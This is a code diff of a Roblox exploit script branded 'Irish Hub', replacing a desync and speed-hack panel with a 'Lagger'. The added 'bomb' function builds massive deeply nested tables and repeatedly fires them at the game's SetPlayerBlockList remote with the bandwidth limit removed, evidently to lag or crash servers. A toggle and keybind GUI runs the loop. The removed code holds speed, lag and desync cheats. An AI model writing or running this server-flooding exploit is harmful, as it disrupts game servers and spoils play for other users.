@@ -1,382 +1,366 @@
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
 local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
-local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
 
-local lp = Players.LocalPlayer
-local lagEnabled = false
-local speedEnabled = false
-local desyncEnabled = false
-local lagAmount = 0.1
-local speedAmount = 30
-local stealAmount = 30
+local LocalPlayer = Players.LocalPlayer
+
+local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+
+local LAGGER_CONFIG = isMobile and {
+    TableIncrease = 290,
+    Tries = 1,
+    LoopWaitTime = 0.85
+} or {
+    TableIncrease = 265,
+    Tries = 1,
+    LoopWaitTime = 0.05
+}
+
+local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+
+local function resolveRemote(path)
+    if not path or path == "" then return nil end
+    local obj = game
+    local cleaned = path:gsub("^game%.", "")
+    for segment in cleaned:gmatch("[^%.]+") do
+        if obj then
+            obj = obj[segment]
+        else
+            return nil
+        end
+    end
+    return obj
+end
+
+local function getmaxvalue(val)
+    local mainvalueifonetable = 499999
+    if type(val) ~= "number" then return nil end
+    return mainvalueifonetable / (val + 2)
+end
+
+local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maximum = getmaxvalue(tableincrease) or 9999999
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+        if i % 5000 == 0 then task.wait() end
+    end
+    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+    if remote then
+        for i = 1, tries do
+            pcall(function()
+                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                    remote:FireServer(maintable)
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(maintable)
+                end
+            end)
+        end
+    end
+end
+
+local laggerEnabled = false
+local laggerThread = nil
+
+local function startLaggerLoop()
+    while laggerEnabled do
+        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+        task.spawn(function()
+            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
+        end)
+        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
+    end
+end
+
+local function stopLaggerLoop()
+    laggerEnabled = false
+    if laggerThread then
+        coroutine.close(laggerThread)
+        laggerThread = nil
+    end
+end
+
+local function startLagger()
+    if laggerThread then return end
+    laggerEnabled = true
+    laggerThread = coroutine.create(startLaggerLoop)
+    coroutine.resume(laggerThread)
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "IrishHubLagger"
+ScreenGui.ResetOnSpawn = false
+if not pcall(function() ScreenGui.Parent = CoreGui end) then
+    ScreenGui.Parent = LocalPlayer.PlayerGui
+end
+
+local Frame = Instance.new("Frame")
+Frame.BackgroundTransparency = 0.4
+Frame.Position = UDim2.new(0, 30, 0, 137)
+Frame.ClipsDescendants = true
+Frame.Active = true
+Frame.BackgroundColor3 = Color3.new(0, 0.3, 0.1)
+Frame.Size = UDim2.new(0, 200, 0, 130)
+Frame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 10)
+UICorner.Parent = Frame
+
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Color = Color3.new(0.6, 1, 0.4)
+UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+UIStroke.Thickness = 2
+UIStroke.Parent = Frame
+
+local TitleLabel = Instance.new("TextLabel")
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+TitleLabel.Font = Enum.Font.GothamBlack
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Position = UDim2.new(0, 10, 0, 5)
+TitleLabel.TextColor3 = Color3.new(0.6, 1, 0.4)
+TitleLabel.Text = "Irish Hub Lagger"
+TitleLabel.TextSize = 15
+TitleLabel.Size = UDim2.new(1, -40, 0, 20)
+TitleLabel.Parent = Frame
+
+local SubLabel = Instance.new("TextLabel")
+SubLabel.BackgroundTransparency = 1
+SubLabel.TextXAlignment = Enum.TextXAlignment.Left
+SubLabel.Font = Enum.Font.GothamMedium
+SubLabel.TextTransparency = 0.5
+SubLabel.TextColor3 = Color3.new(0.6, 1, 0.4)
+SubLabel.Text = "discord.gg/irsh"
+SubLabel.Position = UDim2.new(0, 10, 0, 23)
+SubLabel.TextSize = 11
+SubLabel.Size = UDim2.new(1, -40, 0, 15)
+SubLabel.Parent = Frame
+
+local MinimizeBtn = Instance.new("TextButton")
+MinimizeBtn.Font = Enum.Font.GothamBlack
+MinimizeBtn.BackgroundColor3 = Color3.new(0, 0.4, 0.1)
+MinimizeBtn.Position = UDim2.new(1, -32, 0, 8)
+MinimizeBtn.TextColor3 = Color3.new(0.6, 1, 0.4)
+MinimizeBtn.Text = "-"
+MinimizeBtn.TextSize = 14
+MinimizeBtn.Size = UDim2.new(0, 24, 0, 24)
+MinimizeBtn.Parent = Frame
+
+local MinCorner = Instance.new("UICorner")
+MinCorner.CornerRadius = UDim.new(0, 6)
+MinCorner.Parent = MinimizeBtn
+
+local MinStroke = Instance.new("UIStroke")
+MinStroke.Thickness = 1
+MinStroke.Color = Color3.new(0.6, 1, 0.4)
+MinStroke.Parent = MinimizeBtn
+
+local ToggleRow = Instance.new("Frame")
+ToggleRow.Position = UDim2.new(0, 10, 0, 48)
+ToggleRow.BackgroundColor3 = Color3.new(0, 0.4, 0.15)
+ToggleRow.Size = UDim2.new(1, -20, 0, 34)
+ToggleRow.Parent = Frame
+
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.Parent = ToggleRow
+
+local ToggleStroke = Instance.new("UIStroke")
+ToggleStroke.Color = Color3.new(0.6, 1, 0.4)
+ToggleStroke.Parent = ToggleRow
+
+local ToggleLabel = Instance.new("TextLabel")
+ToggleLabel.BackgroundTransparency = 1
+ToggleLabel.TextXAlignment = Enum.TextXAlignment.Left
+ToggleLabel.TextColor3 = Color3.new(0.6, 1, 0.4)
+ToggleLabel.Font = Enum.Font.GothamMedium
+ToggleLabel.Position = UDim2.new(0, 10, 0, 0)
+ToggleLabel.Text = "Enable Lagger"
+ToggleLabel.TextSize = 13
+ToggleLabel.Size = UDim2.new(1, -60, 1, 0)
+ToggleLabel.Parent = ToggleRow
+
+local SwitchBg = Instance.new("Frame")
+SwitchBg.BackgroundColor3 = Color3.new(0, 0.35, 0.15)
+SwitchBg.Position = UDim2.new(1, -46, 0.5, -9)
+SwitchBg.Size = UDim2.new(0, 36, 0, 18)
+SwitchBg.Parent = ToggleRow
+
+local SwitchBgCorner = Instance.new("UICorner")
+SwitchBgCorner.CornerRadius = UDim.new(0, 9)
+SwitchBgCorner.Parent = SwitchBg
+
+local SwitchKnob = Instance.new("Frame")
+SwitchKnob.BackgroundColor3 = Color3.new(0.6, 1, 0.4)
+SwitchKnob.Position = UDim2.new(0, 2, 0.5, -7)
+SwitchKnob.Size = UDim2.new(0, 14, 0, 14)
+SwitchKnob.Parent = SwitchBg
+
+local SwitchKnobCorner = Instance.new("UICorner")
+SwitchKnobCorner.CornerRadius = UDim.new(0, 7)
+SwitchKnobCorner.Parent = SwitchKnob
+
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Text = ""
+ToggleBtn.BackgroundTransparency = 1
+ToggleBtn.Size = UDim2.new(1, 0, 1, 0)
+ToggleBtn.Parent = ToggleRow
+
+local KeybindRow = Instance.new("Frame")
+KeybindRow.Position = UDim2.new(0, 10, 0, 88)
+KeybindRow.BackgroundColor3 = Color3.new(0, 0.4, 0.15)
+KeybindRow.Size = UDim2.new(1, -20, 0, 34)
+KeybindRow.Parent = Frame
+
+local KeybindCorner = Instance.new("UICorner")
+KeybindCorner.Parent = KeybindRow
+
+local KeybindStroke = Instance.new("UIStroke")
+KeybindStroke.Color = Color3.new(0.6, 1, 0.4)
+KeybindStroke.Parent = KeybindRow
+
+local KeybindLabel = Instance.new("TextLabel")
+KeybindLabel.BackgroundTransparency = 1
+KeybindLabel.TextXAlignment = Enum.TextXAlignment.Left
+KeybindLabel.TextColor3 = Color3.new(0.6, 1, 0.4)
+KeybindLabel.Font = Enum.Font.GothamMedium
+KeybindLabel.Position = UDim2.new(0, 10, 0, 0)
+KeybindLabel.Text = "Keybind"
+KeybindLabel.TextSize = 13
+KeybindLabel.Size = UDim2.new(1, -80, 1, 0)
+KeybindLabel.Parent = KeybindRow
+
+local KeybindBtn = Instance.new("TextButton")
+KeybindBtn.Text = "[ -- ]"
+KeybindBtn.AutoButtonColor = false
+KeybindBtn.BackgroundTransparency = 0.3
+KeybindBtn.Position = UDim2.new(1, -68, 0.5, -11)
+KeybindBtn.BackgroundColor3 = Color3.new(0, 0.35, 0.1)
+KeybindBtn.TextColor3 = Color3.new(0.6, 1, 0.4)
+KeybindBtn.Font = Enum.Font.GothamMedium
+KeybindBtn.TextSize = 10
+KeybindBtn.Size = UDim2.new(0, 60, 0, 22)
+KeybindBtn.Parent = KeybindRow
+
+local KeybindBtnCorner = Instance.new("UICorner")
+KeybindBtnCorner.CornerRadius = UDim.new(0, 5)
+KeybindBtnCorner.Parent = KeybindBtn
+
+local dragging, dragStart, startPos
+Frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = Frame.Position
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        local delta = input.Position - dragStart
+        Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
 local minimized = false
-local sliderDragging = false
-
-local COL_BG = Color3.fromRGB(12, 16, 35)
-local COL_ROW = Color3.fromRGB(20, 25, 50)
-local COL_TOGGLE = Color3.fromRGB(30, 40, 70)
-local COL_GREEN = Color3.fromRGB(0, 200, 0)
-
-local STROKE_COLORS = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 80, 0)),
-	ColorSequenceKeypoint.new(0.4, Color3.fromRGB(0, 200, 0)),
-	ColorSequenceKeypoint.new(0.5, Color3.new(1, 1, 1)),
-	ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 200, 0)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 80, 0)),
-})
-
-local allStrokeGrads = {}
-
-local function addAnimatedStroke(parent, thickness)
-	local s = Instance.new("UIStroke")
-	s.Thickness = thickness or 1
-	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-	s.Color = Color3.new(1, 1, 1)
-	s.Parent = parent
-	local g = Instance.new("UIGradient")
-	g.Color = STROKE_COLORS
-	g.Rotation = 45
-	g.Parent = s
-	table.insert(allStrokeGrads, g)
-	return s, g
-end
-
-local function loadLagValue()
-	if isfile and isfile("IrishHub_LagAmount.txt") then
-		local content = readfile("IrishHub_LagAmount.txt")
-		local value = tonumber(content)
-		if value then return math.clamp(value, 0, 0.2) end
-	end
-	return 0.1
-end
-local function saveLagValue(value)
-	if writefile then writefile("IrishHub_LagAmount.txt", tostring(value)) end
-end
-local function loadSpeedValue()
-	if isfile and isfile("IrishHub_SpeedAmount.txt") then
-		local content = readfile("IrishHub_SpeedAmount.txt")
-		local value = tonumber(content)
-		if value then return math.clamp(value, 1, 120) end
-	end
-	return 30
-end
-local function saveSpeedValue(value)
-	if writefile then writefile("IrishHub_SpeedAmount.txt", tostring(value)) end
-end
-local function loadStealValue()
-	if isfile and isfile("IrishHub_StealAmount.txt") then
-		local content = readfile("IrishHub_StealAmount.txt")
-		local value = tonumber(content)
-		if value then return math.clamp(value, 1, 70) end
-	end
-	return 30
-end
-local function saveStealValue(value)
-	if writefile then writefile("IrishHub_StealAmount.txt", tostring(value)) end
-end
-
-lagAmount = loadLagValue()
-speedAmount = loadSpeedValue()
-stealAmount = loadStealValue()
-
-if not CoreGui:FindFirstChild("HiddenUI") then
-	local f = Instance.new("Folder")
-	f.Name = "HiddenUI"
-	f.Parent = CoreGui
-end
-if CoreGui.HiddenUI:FindFirstChild("IrishHub_DesyncPanel") then
-	CoreGui.HiddenUI.IrishHub_DesyncPanel:Destroy()
-end
-
-local gui = Instance.new("ScreenGui")
-gui.Name = "IrishHub_DesyncPanel"
-gui.ResetOnSpawn = false
-gui.Parent = CoreGui.HiddenUI
-
-local main = Instance.new("Frame")
-main.Size = UDim2.new(0, 200, 0, 290)
-main.Position = UDim2.new(0.5, -100, 0.5, -145)
-main.BackgroundColor3 = COL_BG
-main.BackgroundTransparency = 0.4
-main.BorderSizePixel = 0
-main.ClipsDescendants = true
-main.Active = true
-main.Parent = gui
-
-Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
-addAnimatedStroke(main, 2)
-
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -40, 0, 20)
-title.Position = UDim2.new(0, 10, 0, 5)
-title.BackgroundTransparency = 1
-title.Text = "Irish Hub Desync Panel"
-title.Font = Enum.Font.GothamBlack
-title.TextSize = 15
-title.TextColor3 = Color3.new(1, 1, 1)
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.Parent = main
-
-local titleGrad = Instance.new("UIGradient")
-titleGrad.Color = ColorSequence.new({
-	ColorSequenceKeypoint.new(0, COL_GREEN),
-	ColorSequenceKeypoint.new(0.5, Color3.new(1, 1, 1)),
-	ColorSequenceKeypoint.new(1, COL_GREEN),
-})
-titleGrad.Parent = title
-
-local subtitle = Instance.new("TextLabel")
-subtitle.Size = UDim2.new(1, -40, 0, 15)
-subtitle.Position = UDim2.new(0, 10, 0, 23)
-subtitle.BackgroundTransparency = 1
-subtitle.Text = "discord.gg/irsh"
-subtitle.Font = Enum.Font.GothamMedium
-subtitle.TextSize = 11
-subtitle.TextColor3 = Color3.new(1, 1, 1)
-subtitle.TextTransparency = 0.5
-subtitle.TextXAlignment = Enum.TextXAlignment.Left
-subtitle.Parent = main
-
-local minBtn = Instance.new("TextButton")
-minBtn.Size = UDim2.new(0, 24, 0, 24)
-minBtn.Position = UDim2.new(1, -32, 0, 8)
-minBtn.BackgroundColor3 = COL_TOGGLE
-minBtn.Text = "-"
-minBtn.TextColor3 = Color3.new(1, 1, 1)
-minBtn.Font = Enum.Font.GothamBlack
-minBtn.TextSize = 14
-minBtn.BorderSizePixel = 0
-minBtn.AutoButtonColor = false
-minBtn.Parent = main
-
-Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)
-addAnimatedStroke(minBtn, 1)
-
-minBtn.MouseButton1Click:Connect(function()
-	minimized = not minimized
-	TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quint), {
-		Size = minimized and UDim2.new(0, 200, 0, 40) or UDim2.new(0, 200, 0, 290)
-	}):Play()
-	minBtn.Text = minimized and "+" or "-"
+MinimizeBtn.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    if minimized then
+        Frame.Size = UDim2.new(0, 200, 0, 40)
+        MinimizeBtn.Text = "+"
+    else
+        Frame.Size = UDim2.new(0, 200, 0, 130)
+        MinimizeBtn.Text = "-"
+    end
 end)
 
-local function makeRow(yPos, labelText)
-	local row = Instance.new("Frame")
-	row.Size = UDim2.new(1, -20, 0, 34)
-	row.Position = UDim2.new(0, 10, 0, yPos)
-	row.BackgroundColor3 = COL_ROW
-	row.BorderSizePixel = 0
-	row.Parent = main
-	Instance.new("UICorner", row)
-	addAnimatedStroke(row, 1)
+local function setToggle(state)
+    laggerEnabled = state
+    local goal = state and UDim2.new(1, -16, 0.5, -7) or UDim2.new(0, 2, 0.5, -7)
+    local color = state and Color3.new(0, 0.7, 0.3) or Color3.new(0, 0.35, 0.15)
+    TweenService:Create(SwitchKnob, TweenInfo.new(0.15), {Position = goal}):Play()
+    TweenService:Create(SwitchBg, TweenInfo.new(0.15), {BackgroundColor3 = color}):Play()
 
-	local lbl = Instance.new("TextLabel")
-	lbl.Size = UDim2.new(1, -100, 1, 0)
-	lbl.Position = UDim2.new(0, 10, 0, 0)
-	lbl.BackgroundTransparency = 1
-	lbl.Text = labelText
-	lbl.Font = Enum.Font.GothamBlack
-	lbl.TextSize = 13
-	lbl.TextColor3 = Color3.new(1, 1, 1)
-	lbl.TextXAlignment = Enum.TextXAlignment.Left
-	lbl.Parent = row
-
-	local track = Instance.new("Frame")
-	track.Size = UDim2.new(0, 36, 0, 18)
-	track.Position = UDim2.new(1, -46, 0.5, -9)
-	track.BackgroundColor3 = COL_TOGGLE
-	track.BorderSizePixel = 0
-	track.Parent = row
-	Instance.new("UICorner", track).CornerRadius = UDim.new(0, 9)
-	addAnimatedStroke(track, 1)
-
-	local knob = Instance.new("Frame")
-	knob.Size = UDim2.new(0, 14, 0, 14)
-	knob.Position = UDim2.new(0, 2, 0.5, -7)
-	knob.BackgroundColor3 = Color3.new(1, 1, 1)
-	knob.BorderSizePixel = 0
-	knob.Parent = track
-	Instance.new("UICorner", knob).CornerRadius = UDim.new(0, 7)
-
-	local btn = Instance.new("TextButton")
-	btn.Size = UDim2.new(0, 46, 1, 0)
-	btn.Position = UDim2.new(1, -46, 0, 0)
-	btn.BackgroundTransparency = 1
-	btn.Text = ""
-	btn.Parent = row
-
-	return row, btn, knob, track
+    if state then
+        startLagger()
+    else
+        stopLaggerLoop()
+    end
 end
 
-local function makeSlider(yPos, labelText, min, max, default, formatFn, onChange)
-	local container = Instance.new("Frame")
-	container.Size = UDim2.new(1, -20, 0, 30)
-	container.Position = UDim2.new(0, 10, 0, yPos)
-	container.BackgroundTransparency = 1
-	container.Parent = main
-
-	local lbl = Instance.new("TextLabel")
-	lbl.Size = UDim2.new(1, 0, 0, 14)
-	lbl.Position = UDim2.new(0, 0, 0, 0)
-	lbl.BackgroundTransparency = 1
-	lbl.Text = formatFn(default)
-	lbl.Font = Enum.Font.GothamBold
-	lbl.TextSize = 10
-	lbl.TextColor3 = Color3.new(1, 1, 1)
-	lbl.TextTransparency = 0.3
-	lbl.TextXAlignment = Enum.TextXAlignment.Left
-	lbl.Parent = container
-
-	local bar = Instance.new("Frame")
-	bar.Size = UDim2.new(1, 0, 0, 5)
-	bar.Position = UDim2.new(0, 0, 0, 18)
-	bar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-	bar.BorderSizePixel = 0
-	bar.Parent = container
-	Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)
-
-	local startRel = (default - min) / (max - min)
-
-	local fill = Instance.new("Frame")
-	fill.Size = UDim2.new(startRel, 0, 1, 0)
-	fill.BackgroundColor3 = COL_GREEN
-	fill.BorderSizePixel = 0
-	fill.Parent = bar
-	Instance.new("UICorner", fill).CornerRadius = UDim.new(1, 0)
-
-	local knobS = Instance.new("Frame")
-	knobS.Size = UDim2.new(0, 10, 0, 10)
-	knobS.AnchorPoint = Vector2.new(0.5, 0.5)
-	knobS.Position = UDim2.new(startRel, 0, 0.5, 0)
-	knobS.BackgroundColor3 = Color3.new(1, 1, 1)
-	knobS.BorderSizePixel = 0
-	knobS.Parent = bar
-	Instance.new("UICorner", knobS).CornerRadius = UDim.new(1, 0)
-
-	local thisSliderDragging = false
-
-	bar.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			thisSliderDragging = true
-			sliderDragging = true
-		end
-	end)
-
-	knobS.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			thisSliderDragging = true
-			sliderDragging = true
-		end
-	end)
-
-	UserInputService.InputChanged:Connect(function(input)
-		if thisSliderDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-			local rel = math.clamp((input.Position.X - bar.AbsolutePosition.X) / bar.AbsoluteSize.X, 0, 1)
-			rel = math.floor(rel * 180) / 180
-			fill.Size = UDim2.new(rel, 0, 1, 0)
-			knobS.Position = UDim2.new(rel, 0, 0.5, 0)
-			local val = min + rel * (max - min)
-			lbl.Text = formatFn(val)
-			onChange(val)
-		end
-	end)
-
-	UserInputService.InputEnded:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			if thisSliderDragging then
-				thisSliderDragging = false
-				sliderDragging = false
-			end
-		end
-	end)
-
-	return container
-end
-local function enableDesync()
-pcall(function()
-if raknet then
-raknet.desync(true)
-end
-
-local character = game.Players.LocalPlayer.Character  
-    if character and character:FindFirstChild("Humanoid") then  
-        character.Humanoid.Health = 0  
-        task.wait(0.5)  
-    end  
+ToggleBtn.MouseButton1Click:Connect(function()
+    setToggle(not laggerEnabled)
 end)
 
+local boundKey = nil
+local boundGamepadKey = nil
+local listeningForKey = false
+
+local gamepadNames = {
+    [Enum.KeyCode.ButtonA] = "A",
+    [Enum.KeyCode.ButtonB] = "B",
+    [Enum.KeyCode.ButtonX] = "X",
+    [Enum.KeyCode.ButtonY] = "Y",
+    [Enum.KeyCode.ButtonL1] = "LB",
+    [Enum.KeyCode.ButtonR1] = "RB",
+    [Enum.KeyCode.ButtonL2] = "LT",
+    [Enum.KeyCode.ButtonR2] = "RT",
+    [Enum.KeyCode.ButtonL3] = "LS",
+    [Enum.KeyCode.ButtonR3] = "RS",
+    [Enum.KeyCode.ButtonStart] = "Start",
+    [Enum.KeyCode.ButtonSelect] = "Select",
+    [Enum.KeyCode.DPadUp] = "DUp",
+    [Enum.KeyCode.DPadDown] = "DDown",
+    [Enum.KeyCode.DPadLeft] = "DLeft",
+    [Enum.KeyCode.DPadRight] = "DRight",
+}
+
+local function isGamepadKeyCode(keyCode)
+    return gamepadNames[keyCode] ~= nil
 end
 
-local function disableDesync()
-pcall(function()
-if raknet then
-raknet.desync(false)
-end
-end)
-end
-
-
-do
-	local dragging = false
-	local dragStart = nil
-	local startPos = nil
-	main.InputBegan:Connect(function(input)
-		if sliderDragging then return end
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			dragging = true
-			dragStart = input.Position
-			startPos = main.Position
-		end
-	end)
-	UserInputService.InputChanged:Connect(function(input)
-		if sliderDragging then dragging = false return end
-		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-			local delta = input.Position - dragStart
-			local viewport = workspace.CurrentCamera.ViewportSize
-			local newX = math.clamp(startPos.X.Offset + delta.X, 0, viewport.X - main.AbsoluteSize.X)
-			local newY = math.clamp(startPos.Y.Offset + delta.Y, 0, viewport.Y - main.AbsoluteSize.Y)
-			main.Position = UDim2.new(0, newX, 0, newY)
-		end
-	end)
-	UserInputService.InputEnded:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			dragging = false
-		end
-	end)
-end
-
-RunService.RenderStepped:Connect(function()
-	local offset = Vector2.new(math.sin(tick() * 1.5), 0)
-	for _, g in ipairs(allStrokeGrads) do
-		g.Offset = offset
-	end
+KeybindBtn.MouseButton1Click:Connect(function()
+    listeningForKey = true
+    KeybindBtn.Text = "[ ... ]"
 end)
 
-RunService.RenderStepped:Connect(function()
-	if speedEnabled then
-		local char = lp.Character
-		if char then
-			local hrp = char:FindFirstChild("HumanoidRootPart")
-			local hum = char:FindFirstChildOfClass("Humanoid")
-			if hrp and hum and hum.MoveDirection.Magnitude > 0 then
-				local dir = hum.MoveDirection.Unit
-				local useSpeed = (hum.WalkSpeed <= 25) and stealAmount or speedAmount
-				hrp.AssemblyLinearVelocity = Vector3.new(
-					dir.X * useSpeed,
-					hrp.AssemblyLinearVelocity.Y,
-					dir.Z * useSpeed
-				)
-			end
-		end
-	end
-end)
-
-RunService.RenderStepped:Connect(function()
-	if lagEnabled and lagAmount > 0 then
-		local t = tick()
-		while tick() - t < lagAmount do end
-	end
+UserInputService.InputBegan:Connect(function(input, gpe)
+    if gpe then return end
+    if listeningForKey then
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            boundKey = input.KeyCode
+            boundGamepadKey = nil
+            KeybindBtn.Text = "[ " .. tostring(input.KeyCode):sub(14) .. " ]"
+            listeningForKey = false
+        elseif input.UserInputType == Enum.UserInputType.Gamepad1
+            or input.UserInputType == Enum.UserInputType.Gamepad2
+            or input.UserInputType == Enum.UserInputType.Gamepad3
+            or input.UserInputType == Enum.UserInputType.Gamepad4 then
+            if isGamepadKeyCode(input.KeyCode) then
+                boundGamepadKey = input.KeyCode
+                boundKey = nil
+                KeybindBtn.Text = "[ " .. (gamepadNames[input.KeyCode] or tostring(input.KeyCode):sub(14)) .. " ]"
+                listeningForKey = false
+            end
+        end
+    else
+        if boundKey and input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == boundKey then
+            setToggle(not laggerEnabled)
+        elseif boundGamepadKey and isGamepadKeyCode(input.KeyCode) and input.KeyCode == boundGamepadKey then
+            setToggle(not laggerEnabled)
+        end
+    end
 end)
